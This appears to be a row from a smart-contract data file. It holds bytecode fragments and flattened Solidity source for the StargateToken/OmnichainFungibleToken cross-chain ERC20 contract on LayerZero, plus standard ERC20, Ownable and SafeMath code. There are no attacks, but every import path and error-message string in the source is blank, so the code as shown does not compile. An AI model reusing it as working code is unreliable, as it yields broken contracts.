114610d1d5760048114610d2b57610d36565b8260208301a0610d36565b868360208401a1610d36565b85878460208501a2610d36565b8486888560208601a3610d36565b838587898660208701a45b50505050505050505050565b60025474010000000000000000000000000000000000000000900460ff1681565b600254604080517f95d89b410000000000000000000000000000000000000000000000000000000081529051606092600160a060020a0316916395d89b4191600480830192600092919082900301818387803b1580156104ff57600080fd5b6002546040805160e160020a635e33fc190281523360048201529051600092600160a060020a03169163bc67f832916024808301928692919082900301818387803b158015610e1057600080fd5b505af1158015610e24573d6000803e3d6000fd5b5050600254604080517fa9059cbb000000000000000000000000000000000000000000000000000000008152600160a060020a03888116600483015260248201889052915191909216935063a9059cbb925060448083019260209291908290030181600087803b15801561066157600080fd5b600054600160a060020a03163314610f1f576040805160e560020a62461bcd02815260206004820152602f60248201527f4f6e6c792074686520636f6e7472616374206f776e6572206d6179207065726660448201527f6f726d207468697320616374696f6e0000000000000000000000000000000000606482015290519081900360840190fd5b60028054911515740100000000000000000000000000000000000000000274ff000000000000000000000000000000000000000019909216919091179055565b600254600160a060020a031681565b600254604080517fdd62ed3e000000000000000000000000000000000000000000000000000000008152600160a060020a03858116600483015284811660248301529151600093929092169163dd62ed3e9160448082019260209290919082900301818787803b158015610fe157600080fd5b505af1158015610ff5573d6000803e3d6000fd5b505050506040513d602081101561100b57600080fd5b505193925050505600a165627a7a72305820f4b49c5795540963e7dbce406d43ed9f5f8ec6390c1ef12755adb14845c0d4cf0029,,,,,,,0,,,,,,,,,,0
"// SPDX-License-Identifier: BUSL-1.1 pragma solidity 0.7.6; import ; contract StargateToken is OmnichainFungibleToken { constructor( string memory _name, string memory _symbol, address _endpoint, uint16 _mainEndpointId, uint256 _initialSupplyOnMainEndpoint ) OmnichainFungibleToken(_name, _symbol, _endpoint, _mainEndpointId, _initialSupplyOnMainEndpoint) {} } // SPDX-License-Identifier: BUSL-1.1 pragma solidity 0.7.6; import ; import ; import ; import ; import ; contract OmnichainFungibleToken is ERC20, Ownable, ILayerZeroReceiver, ILayerZeroUserApplicationConfig { // the only endpointId these tokens will ever be minted on // required: the LayerZero endpoint which is passed in the constructor ILayerZeroEndpoint immutable public endpoint; // a map of our connected contracts mapping(uint16 => bytes) public dstContractLookup; // pause the sendTokens() bool public paused; bool public isMain; event Paused(bool isPaused); event SendToChain(uint16 dstChainId, bytes to, uint256 qty); event ReceiveFromChain(uint16 srcChainId, uint64 nonce, uint256 qty); constructor( string memory _name, string memory _symbol, address _endpoint, uint16 _mainChainId, uint256 initialSupplyOnMainEndpoint ) ERC20(_name, _symbol) { if (ILayerZeroEndpoint(_endpoint).getChainId() == _mainChainId) { _mint(msg.sender, initialSupplyOnMainEndpoint); isMain = true; } // set the LayerZero endpoint endpoint = ILayerZeroEndpoint(_endpoint); } function pauseSendTokens(bool _pause) external onlyOwner { paused = _pause; emit Paused(_pause); } function setDestination(uint16 _dstChainId, bytes calldata _destinationContractAddress) public onlyOwner { dstContractLookup[_dstChainId] = _destinationContractAddress; } function chainId() external view returns (uint16){ return endpoint.getChainId(); } function sendTokens( uint16 _dstChainId, // send tokens to this chainId bytes calldata _to, // where to deliver the tokens on the destination chain uint256 _qty, // how many tokens to send address zroPaymentAddress, // ZRO payment address bytes calldata adapterParam // txParameters ) public payable { require(!paused, ); // lock if leaving the safe chain, otherwise burn if (isMain) { // ... transferFrom the tokens to this contract for locking purposes _transfer(msg.sender, address(this), _qty); } else { _burn(msg.sender, _qty); } // abi.encode() the payload with the values to send bytes memory payload = abi.encode(_to, _qty); // send LayerZero message endpoint.send{value: msg.value}( _dstChainId, // destination chainId dstContractLookup[_dstChainId], // destination UA address payload, // abi.encode()'ed bytes msg.sender, // refund address (LayerZero will refund any extra gas back to caller of send() zroPaymentAddress, // unused for this mock/example adapterParam // unused for this mock/example ); emit SendToChain(_dstChainId, _to, _qty); } function lzReceive( uint16 _srcChainId, bytes memory _fromAddress, uint64 nonce, bytes memory _payload ) external override { require(msg.sender == address(endpoint)); // boilerplate! lzReceive must be called by the endpoint for security require( _fromAddress.length == dstContractLookup[_srcChainId].length && keccak256(_fromAddress) == keccak256(dstContractLookup[_srcChainId]), ); // decode (bytes memory _to, uint256 _qty) = abi.decode(_payload, (bytes, uint256)); address toAddress; // load the toAddress from the bytes assembly { toAddress := mload(add(_to, 20)) } // mint the tokens back into existence, to the receiving address if (isMain) { _transfer(address(this), toAddress, _qty); } else { _mint(toAddress, _qty); } emit ReceiveFromChain(_srcChainId, nonce, _qty); } function estimateSendTokensFee(uint16 _dstChainId, bool _useZro, bytes calldata txParameters) external view returns (uint256 nativeFee, uint256 zroFee) { return endpoint.estimateFees(_dstChainId, address(this), bytes(), _useZro, txParameters); } //---------------------------DAO CALL---------------------------------------- // generic config for user Application function setConfig( uint16 _version, uint16 _chainId, uint256 _configType, bytes calldata _config ) external override onlyOwner { endpoint.setConfig(_version, _chainId, _configType, _config); } function setSendVersion(uint16 version) external override onlyOwner { endpoint.setSendVersion(version); } function setReceiveVersion(uint16 version) external override onlyOwner { endpoint.setReceiveVersion(version); } function forceResumeReceive(uint16 _srcChainId, bytes calldata _srcAddress) external override onlyOwner { endpoint.forceResumeReceive(_srcChainId, _srcAddress); } function renounceOwnership() public override onlyOwner {} } // SPDX-License-Identifier: MIT pragma solidity ^0.7.0; import ; import ; import ; contract ERC20 is Context, IERC20 { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; _decimals = 18; } function name() public view virtual returns (string memory) { return _name; } function symbol() public view virtual returns (string memory) { return _symbol; } function decimals() public view virtual returns (uint8) { return _decimals; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal virtual { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { } } // SPDX-License-Identifier: MIT pragma solidity ^0.7.0; import ; abstract contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view virtual returns (address) { return _owner; } modifier onlyOwner() { require(owner() == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } // SPDX-License-Identifier: BUSL-1.1 pragma solidity >=0.5.0; import ; interface ILayerZeroEndpoint is ILayerZeroUserApplicationConfig { // @notice send a LayerZero message to the specified address at a LayerZero endpoint. // @param _dstChainId - the destination chain identifier // @param _destination - the address on destination chain (in bytes). address length/format may vary by chains // @param _payload - a custom bytes payload to send to the destination contract // @param _refundAddress - if the source transaction is cheaper than the amount of value passed, refund the additional amount to this address // @param _zroPaymentAddress - the address of the ZRO token holder who would pay for the transaction // @param _adapterParams - parameters for custom functionality. ie: pay for a specified destination gasAmount, or receive airdropped native gas from the relayer on destination function send(uint16 _dstChainId, bytes calldata _destination, bytes calldata _payload, address payable _refundAddress, address _zroPaymentAddress, bytes calldata _adapterParams) external payable; // @notice used by the messaging library to publish verified payload // @param _srcChainId - the source chain identifier // @param _srcAddress - the source contract (as bytes) at the source chain // @param _dstAddress - the address on destination chain // @param _nonce - the unbound message ordering nonce // @param _gasLimit - the gas limit for external contract execution // @param _payload - verified payload to send to the destination contract function receivePayload(uint16 _srcChainId, bytes calldata _srcAddress, address _dstAddress, uint64 _nonce, uint _gasLimit, bytes calldata _payload) external; // @notice get the inboundNonce of a receiver from a source chain which could be EVM or non-EVM chain // @param _srcChainId - the source chain identifier // @param _srcAddress - the source chain contract address function getInboundNonce(uint16 _srcChainId, bytes calldata _srcAddress) external view returns (uint64); // @notice get the outboundNonce from this source chain which, consequently, is always an EVM // @param _srcAddress - the source chain contract address function getOutboundNonce(uint16 _dstChainId, address _srcAddress) external view returns (uint64); // @notice gets a quote in source native gas, for the amount that send() requires to pay for message delivery // @param _dstChainId - the destination chain identifier // @param _userApplication - the user app address on this EVM chain // @param _payload - the custom message to send over LayerZero // @param _payInZRO - if false, user app pays the protocol fee in native token // @param _adapterParam - parameters for the adapter service, e.g. send some dust native token to dstChain function estimateFees(uint16 _dstChainId, address _userApplication, bytes calldata _payload, bool _payInZRO, bytes calldata _adapterParam) external view returns (uint nativeFee, uint zroFee); // @notice get this Endpoint's immutable source identifier function getChainId() external view returns (uint16); // @notice the interface to retry failed message on this Endpoint destination // @param _srcChainId - the source chain identifier // @param _srcAddress - the source chain contract address // @param _payload - the payload to be retried function retryPayload(uint16 _srcChainId, bytes calldata _srcAddress, bytes calldata _payload) external; // @notice query if any STORED payload (message blocking) at the endpoint. // @param _srcChainId - the source chain identifier // @param _srcAddress - the source chain contract address function hasStoredPayload(uint16 _srcChainId, bytes calldata _srcAddress) external view returns (bool); // @notice query if the _libraryAddress is valid for sending msgs. // @param _userApplication - the user app address on this EVM chain function getSendLibraryAddress(address _userApplication) external view returns (address); // @notice query if the _libraryAddress is valid for receiving msgs. // @param _userApplication - the user app address on this EVM chain function getReceiveLibraryAddress(address _userApplication) external view returns (address); // @notice query if the non-reentrancy guard for send() is on // @return true if the guard is on. false otherwise function isSendingPayload() external view returns (bool); // @notice query if the non-reentrancy guard for receive() is on // @return true if the guard is on. false otherwise function isReceivingPayload() external view returns (bool); // @notice get the configuration of the LayerZero messaging library of the specified version // @param _version - messaging library version // @param _chainId - the chainId for the pending config change // @param _userApplication - the contract address of the user application // @param _configType - type of configuration. every messaging library has its own convention. function getConfig(uint16 _version, uint16 _chainId, address _userApplication, uint _configType) external view returns (bytes memory); // @notice get the send() LayerZero messaging library version // @param _userApplication - the contract address of the user application function getSendVersion(address _userApplication) external view returns (uint16); // @notice get the lzReceive() LayerZero messaging library version // @param _userApplication - the contract address of the user application function getReceiveVersion(address _userApplication) external view returns (uint16); } // SPDX-License-Identifier: BUSL-1.1 pragma solidity >=0.5.0; interface ILayerZeroReceiver { // @notice LayerZero endpoint will invoke this function to deliver the message on the destination // @param _srcChainId - the source endpoint identifier // @param _srcAddress - the source sending contract address from the source chain // @param _nonce - the ordered message nonce // @param _payload - the signed payload is the UA bytes has encoded to be sent function lzReceive(uint16 _srcChainId, bytes calldata _srcAddress, uint64 _nonce, bytes calldata _payload) external; } // SPDX-License-Identifier: BUSL-1.1 pragma solidity >=0.5.0; interface ILayerZeroUserApplicationConfig { // @notice set the configuration of the LayerZero messaging library of the specified version // @param _version - messaging library version // @param _chainId - the chainId for the pending config change // @param _configType - type of configuration. every messaging library has its own convention. // @param _config - configuration in the bytes. can encode arbitrary content. function setConfig(uint16 _version, uint16 _chainId, uint _configType, bytes calldata _config) external; // @notice set the send() LayerZero messaging library version to _version // @param _version - new messaging library version function setSendVersion(uint16 _version) external; // @notice set the lzReceive() LayerZero messaging library version to _version // @param _version - new messaging library version function setReceiveVersion(uint16 _version) external; // @notice Only when the UA needs to resume the message flow in blocking mode and clear the stored payload // @param _srcChainId - the chainId of the source chain // @param _srcAddress - the contract address of the source contract at the source chain function forceResumeReceive(uint16 _srcChainId, bytes calldata _srcAddress) external; } // SPDX-License-Identifier: MIT pragma solidity >=0.6.0 <0.8.0; abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691 return msg.data; } } // SPDX-License-Identifier: MIT pragma solidity ^0.7.0; interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } // SPDX-License-Identifier: MIT pragma solidity ^0.7.0; library SafeMath { function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) { uint256 c = a + b; if (c < a) return (false, 0); return (true, c); } function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) { if (b > a) return (false, 0); return (true, a - b); } function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) { // Gas optimization: this is cheaper than requiring not being zero, but the // benefit is lost if is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522 if (a == 0) return (true, 0); uint256 c = a * b; if (c / a != b) return (false, 0); return (true, c); } function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) { if (b == 0) return (false, 0); return (true, a / b); } function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) { if (b == 0) return (false, 0); return (true, a % b); } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, ); return a - b; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) return 0; uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0, ); return a / b; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0, ); return a % b; } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); return a - b; } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); return a / b; } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); return a % b; } } ",0x6080604052600436106101b65760003560e01c806360f05c7a116100ec5780639a8a05921161008a578063cbed8b9c11610064578063cbed8b9c1461093a578063dd62ed3e146109d0578063f187892214610a0b578063f2fde38b14610a37576101b6565b80639a8a05921461089c578063a457c2d7146108c8578063a9059cbb14610901576101b6565b8063715018a6116100c6578063715018a6146107b757806373874336146107cc5780638da5cb5b1461087257806395d89b4114610887576101b6565b806360f05c7a146106d0578063706d8fff146106fe57806370a0823114610784576101b6565b80632e15238c1161015957806342d65a8d1161013357806342d65a8d146105ef5780635c975abb146106755780635e280f111461068a578063604269d1146106bb576101b6565b80632e15238c146104ad578063313ce5671461058b57806339509351146105b6576101b6565b8063095ea7b311610195578063095ea7b3146103c857806310ddb1371461041557806318160ddd1461044357806323b872dd1461046a576101b6565b80621d3567146101bb57806306fdde031461031057806307e0db171461039a575b600080fd5b3480156101c757600080fd5b5061030e600480360360808110156101de57600080fd5b61ffff8235169190810190604081016020820135600160201b81111561020357600080fd5b82018360208201111561021557600080fd5b803590602001918460018302840111600160201b8311171561023657600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929567ffffffffffffffff853516959094909350604081019250602001359050600160201b81111561029a57600080fd5b8201836020820111156102ac57600080fd5b803590602001918460018302840111600160201b831117156102cd57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550610a6a945050505050565b005b34801561031c57600080fd5b50610325610cf2565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561035f578181015183820152602001610347565b50505050905090810190601f16801561038c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156103a657600080fd5b5061030e600480360360208110156103bd57600080fd5b503561ffff16610d88565b3480156103d457600080fd5b50610401600480360360408110156103eb57600080fd5b506001600160a01b038135169060200135610e6f565b604080519115158252519081900360200190f35b34801561042157600080fd5b5061030e6004803603602081101561043857600080fd5b503561ffff16610e8c565b34801561044f57600080fd5b50610458610f58565b60408051918252519081900360200190f35b34801561047657600080fd5b506104016004803603606081101561048d57600080fd5b506001600160a01b03813581169160208101359091169060400135610f5e565b61030e600480360360a08110156104c357600080fd5b61ffff8235169190810190604081016020820135600160201b8111156104e857600080fd5b8201836020820111156104fa57600080fd5b803590602001918460018302840111600160201b8311171561051b57600080fd5b919390928235926001600160a01b03602082013516929190606081019060400135600160201b81111561054d57600080fd5b82018360208201111561055f57600080fd5b803590602001918460018302840111600160201b8311171561058057600080fd5b509092509050610fe5565b34801561059757600080fd5b506105a0611308565b6040805160ff9092168252519081900360200190f35b3480156105c257600080fd5b50610401600480360360408110156105d957600080fd5b506001600160a01b038135169060200135611311565b3480156105fb57600080fd5b5061030e6004803603604081101561061257600080fd5b61ffff8235169190810190604081016020820135600160201b81111561063757600080fd5b82018360208201111561064957600080fd5b803590602001918460018302840111600160201b8311171561066a57600080fd5b50909250905061135f565b34801561068157600080fd5b5061040161147d565b34801561069657600080fd5b5061069f611486565b604080516001600160a01b039092168252519081900360200190f35b3480156106c757600080fd5b506104016114aa565b3480156106dc57600080fd5b50610325600480360360208110156106f357600080fd5b503561ffff166114b8565b34801561070a57600080fd5b5061030e6004803603604081101561072157600080fd5b61ffff8235169190810190604081016020820135600160201b81111561074657600080fd5b82018360208201111561075857600080fd5b803590602001918460018302840111600160201b8311171561077957600080fd5b509092509050611553565b34801561079057600080fd5b50610458600480360360208110156107a757600080fd5b50356001600160a01b03166115d9565b3480156107c357600080fd5b5061030e6115f4565b3480156107d857600080fd5b50610859600480360360608110156107ef57600080fd5b61ffff823516916020810135151591810190606081016040820135600160201b81111561081b57600080fd5b82018360208201111561082d57600080fd5b803590602001918460018302840111600160201b8311171561084e57600080fd5b509092509050611658565b6040805192835260208301919091528051918290030190f35b34801561087e57600080fd5b5061069f6117c7565b34801561089357600080fd5b506103256117db565b3480156108a857600080fd5b506108b161183c565b6040805161ffff9092168252519081900360200190f35b3480156108d457600080fd5b50610401600480360360408110156108eb57600080fd5b506001600160a01b0381351690602001356118c8565b34801561090d57600080fd5b506104016004803603604081101561092457600080fd5b506001600160a01b038135169060200135611930565b34801561094657600080fd5b5061030e6004803603608081101561095d57600080fd5b61ffff823581169260208101359091169160408201359190810190608081016060820135600160201b81111561099257600080fd5b8201836020820111156109a457600080fd5b803590602001918460018302840111600160201b831117156109c557600080fd5b509092509050611944565b3480156109dc57600080fd5b50610458600480360360408110156109f357600080fd5b506001600160a01b0381358116916020013516611a77565b348015610a1757600080fd5b5061030e60048036036020811015610a2e57600080fd5b50351515611aa2565b348015610a4357600080fd5b5061030e60048036036020811015610a5a57600080fd5b50356001600160a01b0316611b4b565b336001600160a01b037f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6751614610a9f57600080fd5b61ffff8416600090815260066020526040902054835160026000196101006001851615020190921691909104148015610b605750600660008561ffff1661ffff1681526020019081526020016000206040518082805460018160011615610100020316600290048015610b495780601f10610b27576101008083540402835291820191610b49565b820191906000526020600020905b815481529060010190602001808311610b35575b505091505060405180910390208380519060200120145b610b9b5760405162461bcd60e51b81526004018080602001828103825260248152602001806122af6024913960400191505060405180910390fd5b600080828060200190516040811015610bb357600080fd5b8101908080516040519392919084600160201b821115610bd257600080fd5b908301906020820185811115610be757600080fd5b8251600160201b811182820188101715610c0057600080fd5b82525081516020918201929091019080838360005b83811015610c2d578181015183820152602001610c15565b50505050905090810190601f168015610c5a5780820380516001836020036101000a031916815260200191505b5060405260200151601484015160075494965090945092610100900460ff16159150610c92905057610c8d308284611cba565b610c9c565b610c9c8183611e15565b6040805161ffff8916815267ffffffffffffffff8716602082015280820184905290517f831bc68226f8d1f734ffcca73602efc4eca13711402ba1d2cc05ee17bb54f6319181900360600190a150505050505050565b60038054604080516020601f6002600019610100600188161502019095169490940493840181900481028201810190925282815260609390929091830182828015610d7e5780601f10610d5357610100808354040283529160200191610d7e565b820191906000526020600020905b815481529060010190602001808311610d6157829003601f168201915b5050505050905090565b610d90611f05565b6001600160a01b0316610da16117c7565b6001600160a01b031614610dea576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b7f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b03166307e0db17826040518263ffffffff1660e01b8152600401808261ffff168152602001915050600060405180830381600087803b158015610e5457600080fd5b505af1158015610e68573d6000803e3d6000fd5b5050505050565b6000610e83610e7c611f05565b8484611f09565b50600192915050565b610e94611f05565b6001600160a01b0316610ea56117c7565b6001600160a01b031614610eee576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b7f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b03166310ddb137826040518263ffffffff1660e01b8152600401808261ffff168152602001915050600060405180830381600087803b158015610e5457600080fd5b60025490565b6000610f6b848484611cba565b610fdb84610f77611f05565b610fd685604051806060016040528060288152602001612363602891396001600160a01b038a16600090815260016020526040812090610fb5611f05565b6001600160a01b031681526020810191909152604001600020549190611ff5565b611f09565b5060019392505050565b60075460ff16156110275760405162461bcd60e51b81526004018080602001828103825260258152602001806123cc6025913960400191505060405180910390fd5b600754610100900460ff161561104757611042333086611cba565b611051565b611051338561208c565b600086868660405160200180806020018381526020018281038252858582818152602001925080828437600081840152601f19601f82011690508083019250505094505050505060405160208183030381529060405290507f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b031663c5803100348a600660008d61ffff1661ffff16815260200190815260200160002085338a8a8a6040518963ffffffff1660e01b8152600401808861ffff1681526020018060200180602001876001600160a01b03168152602001866001600160a01b031681526020018060200184810384528a8181546001816001161561010002031660029004815260200191508054600181600116156101000203166002900480156111c25780601f10611197576101008083540402835291602001916111c2565b820191906000526020600020905b8154815290600101906020018083116111a557829003601f168201915b505084810383528951815289516020918201918b019080838360005b838110156111f65781810151838201526020016111de565b50505050905090810190601f1680156112235780820380516001836020036101000a031916815260200191505b508481038252858152602001868680828437600081840152601f19601f8201169050808301925050509a50505050505050505050506000604051808303818588803b15801561127157600080fd5b505af1158015611285573d6000803e3d6000fd5b50505050507f664e26797cde1146ddfcb9a5d3f4de61179f9c11b2698599bb09e686f442172b88888888604051808561ffff168152602001806020018381526020018281038252858582818152602001925080828437600083820152604051601f909101601f191690920182900397509095505050505050a15050505050505050565b60055460ff1690565b6000610e8361131e611f05565b84610fd6856001600061132f611f05565b6001600160a01b03908116825260208083019390935260409182016000908120918c168152925290205490611c59565b611367611f05565b6001600160a01b03166113786117c7565b6001600160a01b0316146113c1576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b604080516342d65a8d60e01b815261ffff85166004820190815260248201928352604482018490526001600160a01b037f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd67516926342d65a8d92879287928792606401848480828437600081840152601f19601f820116905080830192505050945050505050600060405180830381600087803b15801561146057600080fd5b505af1158015611474573d6000803e3d6000fd5b50505050505050565b60075460ff1681565b7f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd67581565b600754610100900460ff1681565b60066020908152600091825260409182902080548351601f60026000196101006001861615020190931692909204918201849004840281018401909452808452909183018282801561154b5780601f106115205761010080835404028352916020019161154b565b820191906000526020600020905b81548152906001019060200180831161152e57829003601f168201915b505050505081565b61155b611f05565b6001600160a01b031661156c6117c7565b6001600160a01b0316146115b5576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b61ffff831660009081526006602052604090206115d39083836121ea565b50505050565b6001600160a01b031660009081526020819052604090205490565b6115fc611f05565b6001600160a01b031661160d6117c7565b6001600160a01b031614611656576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b565b6000807f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b03166340a7bb108730604051806020016040528060008152508989896040518763ffffffff1660e01b8152600401808761ffff168152602001866001600160a01b0316815260200180602001851515815260200180602001838103835287818151815260200191508051906020019080838360005b838110156117105781810151838201526020016116f8565b50505050905090810190601f16801561173d5780820380516001836020036101000a031916815260200191505b508381038252848152602001858580828437600081840152601f19601f82011690508083019250505098505050505050505050604080518083038186803b15801561178757600080fd5b505afa15801561179b573d6000803e3d6000fd5b505050506040513d60408110156117b157600080fd5b5080516020909101519097909650945050505050565b60055461010090046001600160a01b031690565b60048054604080516020601f6002600019610100600188161502019095169490940493840181900481028201810190925282815260609390929091830182828015610d7e5780601f10610d5357610100808354040283529160200191610d7e565b60007f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b0316633408e4706040518163ffffffff1660e01b815260040160206040518083038186803b15801561189757600080fd5b505afa1580156118ab573d6000803e3d6000fd5b505050506040513d60208110156118c157600080fd5b5051905090565b6000610e836118d5611f05565b84610fd68560405180606001604052806025815260200161243a60259139600160006118ff611f05565b6001600160a01b03908116825260208083019390935260409182016000908120918d16815292529020549190611ff5565b6000610e8361193d611f05565b8484611cba565b61194c611f05565b6001600160a01b031661195d6117c7565b6001600160a01b0316146119a6576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b7f00000000000000000000000066a71dcef29a0ffbdbe3c6a460a3b5bc225cd6756001600160a01b031663cbed8b9c86868686866040518663ffffffff1660e01b8152600401808661ffff1681526020018561ffff168152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b158015611a5857600080fd5b505af1158015611a6c573d6000803e3d6000fd5b505050505050505050565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b611aaa611f05565b6001600160a01b0316611abb6117c7565b6001600160a01b031614611b04576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b6007805482151560ff19909116811790915560408051918252517f0e2fb031ee032dc02d8011dc50b816eb450cf856abd8261680dac74f72165bd29181900360200190a150565b611b53611f05565b6001600160a01b0316611b646117c7565b6001600160a01b031614611bad576040805162461bcd60e51b8152602060048201819052602482015260008051602061238b833981519152604482015290519081900360640190fd5b6001600160a01b038116611bf25760405162461bcd60e51b81526004018080602001828103825260268152602001806122f56026913960400191505060405180910390fd5b6005546040516001600160a01b0380841692610100900416907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b600082820183811015611cb3576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b6001600160a01b038316611cff5760405162461bcd60e51b81526004018080602001828103825260258152602001806123f16025913960400191505060405180910390fd5b6001600160a01b038216611d445760405162461bcd60e51b815260040180806020018281038252602381526020018061228c6023913960400191505060405180910390fd5b611d4f838383612188565b611d8c8160405180606001604052806026815260200161233d602691396001600160a01b0386166000908152602081905260409020549190611ff5565b6001600160a01b038085166000908152602081905260408082209390935590841681522054611dbb9082611c59565b6001600160a01b038084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b6001600160a01b038216611e70576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b611e7c60008383612188565b600254611e899082611c59565b6002556001600160a01b038216600090815260208190526040902054611eaf9082611c59565b6001600160a01b0383166000818152602081815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b3390565b6001600160a01b038316611f4e5760405162461bcd60e51b81526004018080602001828103825260248152602001806124166024913960400191505060405180910390fd5b6001600160a01b038216611f935760405162461bcd60e51b815260040180806020018281038252602281526020018061231b6022913960400191505060405180910390fd5b6001600160a01b03808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b600081848411156120845760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b83811015612049578181015183820152602001612031565b50505050905090810190601f1680156120765780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b6001600160a01b0382166120d15760405162461bcd60e51b81526004018080602001828103825260218152602001806123ab602191396040019150